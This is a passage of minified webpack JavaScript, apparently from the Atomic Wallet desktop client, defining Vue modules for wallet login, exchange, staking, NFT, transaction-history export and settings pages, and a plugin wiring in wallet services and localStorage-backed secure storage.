        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1331),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5498: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(808),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1333),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5500: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(810),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1341),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5501: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(811),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1335),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5504: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(813),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1340),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5505: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(814),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1338),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5512: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(817),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1339),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5513: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        Object.defineProperty(t, "Create", {
          enumerable: !0,
          get: function () {
            return o.default;
          },
        }),
        Object.defineProperty(t, "Entry", {
          enumerable: !0,
          get: function () {
            return s.default;
          },
        }),
        Object.defineProperty(t, "Login", {
          enumerable: !0,
          get: function () {
            return n.default;
          },
        }),
        Object.defineProperty(t, "Restore", {
          enumerable: !0,
          get: function () {
            return r.default;
          },
        });
      var s = a(i(5514)),
        n = a(i(5515)),
        o = a(i(5516)),
        r = a(i(5525));
    },
    5514: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(818),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1342),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5515: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(819),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1343),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5516: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(820),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1348),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5525: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(825),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1349),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5526: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        Object.defineProperty(t, "Exchange", {
          enumerable: !0,
          get: function () {
            return s.default;
          },
        }),
        Object.defineProperty(t, "ExchangeBasic", {
          enumerable: !0,
          get: function () {
            return n.default;
          },
        }),
        Object.defineProperty(t, "ExchangeHistory", {
          enumerable: !0,
          get: function () {
            return o.default;
          },
        });
      var s = a(i(5527)),
        n = a(i(5529)),
        o = a(i(5531));
    },
    5527: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(826),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1351),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5529: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(828),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1357),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5531: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(834),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1359),
        r = i(1);
      function c(e) {
        i(5532);
      }
      var l = !1,
        d = c,
        u = "data-v-5b551d5b",
        h = null,
        p = Object(r["a"])(s.a, o["a"], o["b"], l, d, u, h);
      t["default"] = p.exports;
    },
    5532: function (e, t, i) {
      var a = i(5533);
      a.__esModule && (a = a.default),
        "string" === typeof a && (a = [[e.i, a, ""]]),
        a.locals && (e.exports = a.locals);
      var s = i(25).default;
      s("04cc9200", a, !0, {});
    },
    5533: function (e, t, i) {
      (t = e.exports = i(23)(!1)),
        t.push([
          e.i,
          "\n.adapted-loader[data-v-5b551d5b]{padding-top:3ex;text-align:center\n}\n",
          "",
        ]);
    },
    5536: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        Object.defineProperty(t, "SimplexExchange", {
          enumerable: !0,
          get: function () {
            return n.default;
          },
        }),
        Object.defineProperty(t, "SimplexHistory", {
          enumerable: !0,
          get: function () {
            return o.default;
          },
        }),
        Object.defineProperty(t, "SimplexMain", {
          enumerable: !0,
          get: function () {
            return s.default;
          },
        }),
        Object.defineProperty(t, "SimplexWebview", {
          enumerable: !0,
          get: function () {
            return r.default;
          },
        });
      var s = a(i(5537)),
        n = a(i(5539)),
        o = a(i(5543)),
        r = a(i(5544));
    },
    5537: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(836),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1361),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5539: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(838),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1363),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5543: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(840),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1364),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5544: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(841),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1365),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5545: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        Object.defineProperty(t, "MembershipTab", {
          enumerable: !0,
          get: function () {
            return o.default;
          },
        }),
        Object.defineProperty(t, "PrivateKeys", {
          enumerable: !0,
          get: function () {
            return s.default;
          },
        }),
        Object.defineProperty(t, "SecurityTab", {
          enumerable: !0,
          get: function () {
            return n.default;
          },
        });
      var s = a(i(5546)),
        n = a(i(5550)),
        o = a(i(5551));
    },
    5546: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(842),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1368),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5550: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(845),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1369),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5551: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(846),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1370),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5553: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(5554)),
        n = a(i(5555)),
        o = { atomicCore: s.default, core: n.default };
      t.default = o;
    },
    5554: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }), (t.default = r);
      var s = i(30),
        n = a(i(267));
      const o = new s.SecureStorage({
        storage: localStorage,
        getItem(e, t, i) {
          try {
            const i = this.storage.getItem(e);
            if (null === i) throw new Error("Key is not exists");
            t(i);
          } catch (a) {
            i(a);
          }
        },
        setItem(e, t, i, a) {
          try {
            const a = this.storage.setItem(e, t);
            i(a);
          } catch (s) {
            a(s);
          }
        },
        remove(e, t) {
          const i = this.storage.removeItem(e);
          t(i);
        },
      });
      function r(e) {
        Object.defineProperties(e.prototype, {
          $membership: {
            get() {
              return new s.Membership(s.Wallets);
            },
          },
          $cashback: {
            get() {
              return (
                s.Cashback.setCashbackWallet(
                  s.Wallets.getWallet("e1326549e8ba36b606d8cec00d930139")
                ),
                s.Cashback
              );
            },
          },
          $staking: {
            get() {
              return new s.Stakings();
            },
          },
          $simplexDb: {
            get() {
              return new s.SimplexDb();
            },
          },
          $exchanges: {
            get() {
              return new s.Exchanges();
            },
          },
          $reviews: {
            get() {
              return new s.Reviews();
            },
          },
          $activeWalletsList: {
            get() {
              return n.default;
            },
          },
          $wallets: {
            get() {
              return s.Wallets;
            },
          },
          $rates: {
            get() {
              return s.Rates;
            },
          },
          $buy: {
            get() {
              return s.Buy;
            },
          },
          $inviteFriends: {
            get() {
              return s.inviteFriendsProgram;
            },
          },
          $history: {
            get() {
              return s.History;
            },
          },
        });
      }
      s.Wallets.setVault(o);
    },
    5555: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }), (t.default = o);
      var s = a(i(224));
      const n = new s.default();
      function o(e) {
        Object.defineProperties(e.prototype, {
          $bus: {
            get() {
              return n;
            },
          },
          $electron: {
            get() {
              return window.electron;
            },
          },
          $ga: {
            get() {
              return { event() {}, customParams: {} };
            },
          },
        });
      }
    },
    708: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = a(i(5060)),
        o = a(i(5072)),
        r = a(i(5073)),
        c = a(i(5082)),
        l = a(i(5083)),
        d = {
          name: "NFT",
          components: {
            NFTInfo: n.default,
            NFTEmpty: c.default,
            NFTGallery: l.default,
            NFTReceive: o.default,
            NFTSendToken: r.default,
          },
          data: () => ({
            isLoading: !0,
            getNftTimeout: null,
            selectedNFT: null,
            showInfoPopup: !1,
            showReceivePopup: !1,
            showSendPopup: !1,
          }),
          computed: {
            ...(0, s.mapGetters)(["allNft"]),
            isOpenPopup() {
              return (
                !0 === this.showInfoPopup ||
                !0 === this.showReceivePopup ||
                !0 === this.showSendPopup
              );
            },
          },
          beforeMount() {
            "nft-id-receive" === this.$route.name && this.toggleReceivePopup();
          },
          mounted() {
            this.$wallets.initUpdateNft(),
              this.fetchNft(),
              (this.isLoading = !1),
              this.$bus.$on("update::nft::list::wallet", this.setNFT);
          },
          beforeDestroy() {
            this.$bus.$off("update::nft::list::wallet", this.setNFT),
              clearTimeout(this.getNftTimeout);
          },
          methods: {
            ...(0, s.mapActions)(["setNFT"]),
            fetchNft() {
              clearTimeout(this.getNftTimeout),
                this.setNFT(),
                (this.getNftTimeout = setTimeout(() => this.fetchNft(), 2e4));
            },
            closeAll() {
              (this.showSendPopup = !1), (this.showInfoPopup = !1);
            },
            toggleReceivePopup() {
              this.showReceivePopup = !this.showReceivePopup;
            },
            toggleSendPopup() {
              this.showSendPopup = !this.showSendPopup;
            },
            toggleInfo(e) {
              e &&
                ((this.selectedNFT = this.allNft.find((t) => {
                  let { coinId: i, contractAddress: a, tokenId: s } = t;
                  return `${i}-${a}-${s}` === e;
                })),
                (this.showInfoPopup = !0));
            },
          },
        };
      t.default = d;
    },
    724: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = a(i(5087)),
        o = a(i(5449)),
        r = a(i(5450)),
        c = {
          name: "MainPage",
          components: {
            RefreshButton: o.default,
            TableCoins: n.default,
            TokenAddTabs: r.default,
          },
          data() {
            return {
              showTokenPopup: !1,
              coinTokenPopup: this.$wallets.getWallet("ETH", "atomic"),
              isEditToken: !1,
            };
          },
          computed: {
            ...(0, s.mapGetters)([
              "fiatRate",
              "isUpdatingFiat",
              "alwaysExcludedCoins",
            ]),
          },
          beforeMount() {
            if (!localStorage.getItem("WALLET_EXCLUDED_COINS")) {
              const e = this.$wallets.getHiddenWallets(),
                t = e
                  .map((e) => {
                    let { id: t } = e;
                    return t;
                  })
                  .concat(this.alwaysExcludedCoins);
              this.setWalletExcludedCoins(t);
            }
            this.$wallets.initUpdateBalances(),
              this.$wallets.initUpdateTransactions(),
              this.$wallets.initUpdateNft(),
              this.setNotifyTree(),
              this.setCompletedReason(),
              this.setNFT(),
              this.$bus.$on("update::nft::list::wallet", this.setNFT);
          },
          beforeDestroy() {
            this.$bus.$off("update::nft::list::wallet", this.setNFT);
          },
          methods: {
            ...(0, s.mapActions)([
              "setNFT",
              "setNotifyTree",
              "setCompletedReason",
              "setWalletExcludedCoins",
            ]),
            editToken(e) {
              (this.showTokenPopup = !0),
                "" !== e &&
                  ((this.isEditToken = !0), (this.coinTokenPopup = e));
            },
            toggleTokenPopup() {
              this.showTokenPopup = !this.showTokenPopup;
            },
            closeTokenPopup() {
              (this.showTokenPopup = !1),
                (this.isEditToken = !1),
                (this.coinTokenPopup = this.$wallets.getWallet(
                  "ETH",
                  "atomic"
                ));
            },
          },
        };
      t.default = c;
    },
    762: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = i(196),
        o = i(15),
        r = a(i(319)),
        c = a(i(483)),
        l = a(i(2286)),
        d = a(i(2283)),
        u = a(i(2285)),
        h = a(i(5455)),
        p = a(i(5456)),
        m = a(i(2281));
      const f = 20,
        v = 100,
        g = "-";
      var b = {
        name: "HistoryPage",
        components: {
          Table: r.default,
          Search: c.default,
          BuyBitcoin: l.default,
          FilterPopup: d.default,
          FilterButton: u.default,
          ExportButton: h.default,
          SuccessIconBig: p.default,
          HistoryTableRow: m.default,
        },
        mixins: [o.HistoryMixin],
        data() {
          return {
            filter: "",
            settingsState: !1,
            page: 1,
            isSavedTransactionPopup: !1,
            txs: this.$wallets.transactions,
            loadingPromise: this.$wallets.allTransactionsPromise,
            header: [{ slot: "header-row-1" }, { slot: "header-row-2" }],
          };
        },
        computed: {
          ...(0, s.mapGetters)([
            "historyExcludedCoins",
            "historyExcludedDirections",
            "historyExcludedTypes",
          ]),
          highlightSetting() {
            return (
              this.historyExcludedCoins.length > 0 ||
              this.historyExcludedDirections.length > 0 ||
              this.historyExcludedTypes.length > 0
            );
          },
          transactions() {
            return this.txs
              .filter((e) => {
                let {
                  walletid: t,
                  name: i,
                  ticker: a,
                  direction: s,
                  title: n,
                  amount: o,
                } = e;
                const r = this.historyExcludedCoins.includes(
                    (null !== t && void 0 !== t ? t : "").toUpperCase()
                  ),
                  c = this.historyExcludedDirections.includes(
                    s ? "Received" : "Sent"
                  ),
                  l = this.historyExcludedTypes.includes(n);
                if (r || l || c || "0" === o) return !1;
                if (this.filter.length) {
                  const e = this.filter.toLowerCase().trim();
                  return [i, a].some(
                    (t) =>
                      (null !== t && void 0 !== t ? t : "")
                        .toLowerCase()
                        .indexOf(e) >= 0
                  );
                }
                return !0;
              })
              .slice(0, f * this.page);
          },
          coinsInvolvedInHistory() {
            const e = new Set(this.txs.map((e) => e.ticker));
            return Array.from(this.$wallets).filter(
              (t) =>
                -1 !== e.has(t.ticker) &&
                !n.DISABLED_COINS.includes(t.deprecatedParent)
            );
          },
          isEmpty() {
            return 0 === this.txs.length;
          },
        },
        created() {
          this.loadingPromise && this.extractPromiseData(this.loadingPromise);
        },
        methods: {
          ...(0, s.mapActions)([
            "setHistoryExcludedCoins",
            "setHistoryExcludedTypes",
            "setHistoryExcludedDirections",
          ]),
          extractPromiseData(e) {
            Promise.resolve(e)
              .then((e) => {
                this.txs = e;
              })
              .catch((e) => {
                console.error(e);
              })
              .finally(() => {
                this.loadingPromise = null;
              });
          },
          updateHistory() {
            this.loadingPromise ||
              ((this.loadingPromise = this.$wallets.getTransactions()),
              this.extractPromiseData(this.loadingPromise));
          },
          async exportHistory() {
            if (this.isEmpty) return;
            const e = this.txs.map((e) => {
                let t = g,
                  i = g;
                try {
                  const a = this.$wallets.getWallet(e.deprecatedParent),
                    { explorer: s } = a,
                    { webUrl: n } = s;
                  (i = this.$wallets.getWallet(e.walletid).address),
                    (t = n && e.txid ? `${n}${e.txid}` : g);
                } catch (o) {
                  console.warn(o);
                }
                const a = i || g,
                  s = e.direction,
                  n = {
                    DATE: new Intl.DateTimeFormat("en-GB", {
                      dateStyle: "long",
                      timeStyle: "long",
                    }).format(e.datetime),
                    TYPE: e.txType || g,
                    OUTAMOUNT: s ? g : e.amount,
                    OUTCURRENCY: s ? g : e.ticker,
                    FEEAMOUNT: e.fee,
                    FEECURRENCY: e.feeTicker,
                    OUTTXID: s ? e.otherSideAddress : a,
                    OUTTXURL: t || g,
                    INAMOUNT: s ? e.amount : g,
                    INCURRENCY: s ? e.ticker : g,
                    INTXID: s ? a : e.otherSideAddress,
                    INTXURL: (s && t) || g,
                    ORDERID: e.txid,
                    ADDRESSTO: s ? a : e.otherSideAddress,
                  };
                return n;
              }),
              t = `"${Object.keys(e[0]).join('","')}"\n      ${e
                .map((e) => `"${Object.values(e).join('","')}"`)
                .join("\n")}`,
              i = this.$moment(new Date()).format("DD.MM.YYYY"),
              a = `history-atomicwallet-${i}.csv`;
            this.isSavedTransactionPopup =
              await this.$electron.ipcRenderer.invoke("exportTransactions", {
                fileName: a,
                body: t,
              });
          },
          acceptFilter(e) {
            this.setHistoryExcludedCoins(e.excludedCoins),
              this.setHistoryExcludedTypes(e.types),
              this.setHistoryExcludedDirections(e.directions),
              (this.settingsState = !1);
          },
          handleScrollEnd(e) {
            e.target.scrollHeight -
              (e.target.offsetHeight + e.target.scrollTop) >
              v ||
              (this.txs.length >= f * this.page && (this.page += 1));
          },
        },
      };
      t.default = b;
    },
    766: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = {
        name: "Support",
        data: () => ({ enableMonitoring: !0 }),
        computed: {
          contactSupport() {
            return { tags: ["general_tag"] };
          },
        },
        watch: {
          enableMonitoring(e) {
            localStorage.setItem("isMonitoringEnabled", e);
          },
        },
        beforeMount() {
          const e = localStorage.getItem("isMonitoringEnabled");
          this.enableMonitoring = !e || /true/i.test(e);
        },
      };
      t.default = a;
    },
    767: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(313)),
        n = a(i(66)),
        o = i(17),
        r = a(i(319)),
        c = a(i(483)),
        l = a(i(58)),
        d = a(i(5459)),
        u = a(i(312)),
        h = a(i(5460));
      const p = { ONT: "ONG", NEO: "GAS", VET: "VTHO", WINK: "WIN" },
        m = ["VET", "ALGO", "KMD", "NEO"],
        f = { WIN: "WINK" },
        v = "new",
        g = 6e4,
        b = 6e4;
      var w = {
        name: "StakingPage",
        components: {
          Table: r.default,
          CoinIcon: l.default,
          StakingEmpty: d.default,
          StakingPopupTabs: h.default,
          AtomicNotifyPoint: u.default,
          Search: c.default,
        },
        data: () => ({
          isStakingExchangePopup: !1,
          activeSortField: "",
          isSortASC: !1,
          updatedTable: Date.now(),
          updateTableIntervalID: null,
          updateNearBalancesIntervalID: null,
          activeStaking: null,
          searchInput: "",
          header: [
            { key: "name", slot: "header-row-1" },
            { title: "Available", key: "fiatBalance" },
            { title: "Staked", key: "fiatStaked" },
            { title: "Yearly yield", key: "reward" },
          ],
        }),
        computed: {
          ...(0, o.mapGetters)([
            "fiatRate",
            "coinRate",
            "fiatCharacter",
            "balanceSummary",
            "stakingSettings",
            "isUpdatingFiat",
          ]),
          isEmptyScreen() {
            return (
              !1 === this.isUpdatingFiat &&
              0 === Number(this.balanceSummary(this.fiatRate))
            );
          },
          tableItems() {
            const e = this.stakingSettings
              .map((e) => {
                let {
                  ticker: t,
                  name: i,
                  reward: a,
                  displayTicker: s,
                  tags: o = [],
                  emptyTag: r = null,
                  isDefaultBuyCrypto: c = !1,
                  id: l,
                } = e;
                const d = this.$wallets.getWallet(l);
                let u = "0",
                  h = "0",
                  p = "0",
                  g = "0";
                if (d) {
                  try {
                    if (m.includes(t)) {
                      var b, w, x;
                      const e = +(null !==
                        (b =
                          null !==
                            (w =
                              null === (x = d.balances) || void 0 === x
                                ? void 0
                                : x.available) && void 0 !== w
                            ? w
                            : null === d || void 0 === d
                            ? void 0
                            : d.divisibleBalance) && void 0 !== b
                        ? b
                        : 0);
                      u = String(
                        this.$options.filters.formatFiatV2(e, this.fiatRate)
                      );
                    } else {
                      var T, y, C, _, k, S;
                      u =
                        null !==
                          (T =
                            null !==
                              (y =
                                null !==
                                  (C =
                                    null === (_ = d.getAvailableBalance) ||
                                    void 0 === _
                                      ? void 0
                                      : _.call(d).toCurrency()) && void 0 !== C
                                  ? C
                                  : null === (k = d.balances) || void 0 === k
                                  ? void 0
                                  : k.available) && void 0 !== y
                              ? y
                              : null === (S = d.balances) || void 0 === S
                              ? void 0
                              : S.availableForStake) && void 0 !== T
                          ? T
                          : "0";
                    }
                  } catch (j) {
                    console.log(j), (u = "0");
                  }
                  try {
                    var P, E, $, A, R, I, N, O, D, F, B, W, M, L;
                    if ("SOL" === t)
                      p = d.toCurrencyUnit(
                        null === (P = d.balances) ||
                          void 0 === P ||
                          null === (E = P.staking) ||
                          void 0 === E
                          ? void 0
                          : E.reduce(
                              (e, t) =>
                                t.isAvailableForWithdraw || t.isDeactivated
                                  ? e
                                  : e.add(new d.BN(t.staked)),
                              new d.BN("0")
                            )
                      );
                    else if (
                      ((p =
                        null === ($ = d.getStakedBalance) ||
                        void 0 === $ ||
                        null === (A = $.call(d)) ||
                        void 0 === A
                          ? void 0
                          : A.toCurrency()),
                      !p)
                    )
                      p =
                        null === d ||
                        void 0 === d ||
                        null === (R = d.toCurrencyUnit) ||
                        void 0 === R
                          ? void 0
                          : R.call(
                              d,
                              null !==
                                (I =
                                  null !==
                                    (N =
                                      null !==
                                        (O =
                                          null !==
                                            (D =
                                              null === (F = d.balances) ||
                                              void 0 === F
                                                ? void 0
                                                : F.staked) && void 0 !== D
                                            ? D
                                            : null === (B = d.balances) ||
                                              void 0 === B ||
                                              null === (W = B.staking) ||
                                              void 0 === W
                                            ? void 0
                                            : W.total) && void 0 !== O
                                        ? O
                                        : null === (M = d.balances) ||
                                          void 0 === M
                                        ? void 0
                                        : M.frozen) && void 0 !== N
                                    ? N
                                    : null === (L = d.balances) || void 0 === L
                                    ? void 0
                                    : L.total) && void 0 !== I
                                ? I
                                : "0"
                            );
                  } catch (j) {
                    console.log(j), (p = "0");
                  }
                  const e = new n.default(this.coinRate(this.fiatRate, d).rate);
                  (h = e.multipliedBy(u)), (g = e.multipliedBy(p));
                }
                const H = o.filter((e) => e !== v);
                return {
                  id: l,
                  ticker: f[t] || t,
                  tags: H,
                  name: i,
                  reward: a,
                  staked: p,
                  balance: u,
                  fiatStaked: g,
                  fiatBalance: h,
                  displayTicker: s,
                  emptyTag: r,
                  isDefaultBuyCrypto: c,
                  walletInstance: d,
                  updatedTable: this.updatedTable,
                };
              })
              .filter((e) => {
                let { ticker: t, name: i } = e;
                return (
                  !this.searchInput ||
                  [t, i].some((e) =>
                    e.toLowerCase().startsWith(this.searchInput.toLowerCase())
                  )
                );
              });
            return this.activeSortField
              ? this.isSortASC
                ? (0, s.default)(e).asc((e) => +e[this.activeSortField])
                : (0, s.default)(e).desc((e) => +e[this.activeSortField])
              : e;
          },
        },
        async beforeMount() {
          if (
            ((this.updateTableIntervalID = setInterval(() => {
              this.updatedTable = Date.now();
            }, g)),
            this.stakingSettings.find((e) => {
              let { ticker: t } = e;
              return "NEAR" === t;
            }) &&
              (await this.getNearBalances(),
              (this.updateNearBalancesIntervalID = setInterval(async () => {
                await this.getNearBalances();
              }, b)),
              this.$bus.$on("get-near-balances", this.getNearBalances)),
            this.$route.params.ticker)
          ) {
            const e = this.tableItems.find(
              (e) =>
                [this.$route.params.ticker.toUpperCase(), p[e.ticker]].some(
                  (t) => e.ticker === t
                ) || e.id === this.$route.params.ticker
            );
            this.openExchangePopup(e);
          }
        },
        beforeDestroy() {
          clearInterval(this.updateTableIntervalID),
            clearInterval(this.updateNearBalancesIntervalID),
            this.$bus.$off("get-near-balances", this.getNearBalances);
        },
        methods: {
          async getNearBalances() {
            const e = this.$wallets.getWallet("NEAR");
            if (e)
              try {
                var t;
                await (null === (t = e.getStakingInfo) || void 0 === t
                  ? void 0
                  : t.call(e));
              } catch (i) {
                console.error(i);
              }
          },
          handleClick(e) {
            this.$store.commit("ADD_COMPLETED_REASON", "staking-" + e.ticker),
              this.openExchangePopup(e);
          },
          openExchangePopup(e) {
            this.Texts.setTicker("AWC-986" === e.ticker ? "AWC" : e.ticker),
              (this.activeStaking = e);
          },
          closeExchangePopup() {
            this.activeStaking = null;
          },
          sortByField(e) {
            this.activeSortField === e
              ? (this.isSortASC = !this.isSortASC)
              : ((this.activeSortField = e), (this.isSortASC = !0));
          },
        },
      };
      t.default = w;
    },
    807: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(312)),
        n = {
          name: "SettingsPage",
          components: { AtomicNotifyPoint: s.default },
          data: () => ({
            tabs: [
              { title: "Membership", name: "membership-tab" },
              { title: "Security", name: "change-password-tab" },
              { title: "Private Keys", name: "private-keys-tab" },
            ],
          }),
        };
      t.default = n;
    },
    808: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(313)),
        n = i(17),
        o = i(15),
        r = a(i(2187)),
        c = a(i(319)),
        l = a(i(2280)),
